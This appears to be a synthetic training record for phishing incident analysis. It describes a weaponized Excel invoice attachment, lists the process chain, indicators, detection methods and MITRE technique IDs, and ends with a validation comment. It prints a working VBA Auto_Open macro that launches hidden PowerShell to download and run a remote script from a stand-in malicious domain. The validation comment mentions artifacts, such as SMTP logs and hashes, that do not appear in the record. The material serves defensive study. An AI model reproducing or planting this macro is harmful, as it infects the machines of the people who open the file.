technical_data.macro_code_snippet:
Sub Auto_Open()
    Dim strCmd As String
    strCmd = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')\""
    Shell strCmd, vbHide
End Sub
process_chain: explorer.exe -> excel.exe (Invoice_May2023.xlsm opened) -> powershell.exe -nop -w hidden -c IEX ... -> cmd.exe -> downloader payload

indicators.suspicious_sender_domain: secure-payments.com (recently registered, spoofing legitimate payment services)
indicators.attachment_type: Excel macro-enabled workbook (.xlsm) with embedded Auto_Open macro
indicators.process_behavior: excel.exe spawning hidden powershell with encoded remote download command

example.detection_method: Email gateway sandboxing flagged .xlsm attachment executing suspicious PowerShell commands; Endpoint detection flagged process creation chain involving Excel spawning PowerShell with network activity to suspicious domain; Network IDS detected HTTP GET to known malicious domain; User reported unexpected invoice email triggering incident response.
relevant_mitre_techniques: T1059.001 - Command and Scripting Interpreter: PowerShell
T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

validation.comments: The sample accurately represents the stated cybersecurity problem of malicious attachments in social engineering attacks. The scenario describes a spear-phishing email with a weaponized Excel macro attachment that executes malware upon opening, aligning well with the problem nature. The technical data is comprehensive and realistic, including detailed email headers, body, SMTP logs, attachment hashes, macro code snippet, registry artifacts, process chain, network traffic, DNS queries, and domain registration info. Indicators clearly highlight suspicious sender domain, attachment type, macro commands, network IOCs, file hashes, registry persistence, and process behavior, effectively linking the sample to the problem. The detection methods and relevant MITRE techniques are appropriate and support the scenario. All required fields are present and accurately populated, making the sample complete and plausible for real-world incident analysis and training.
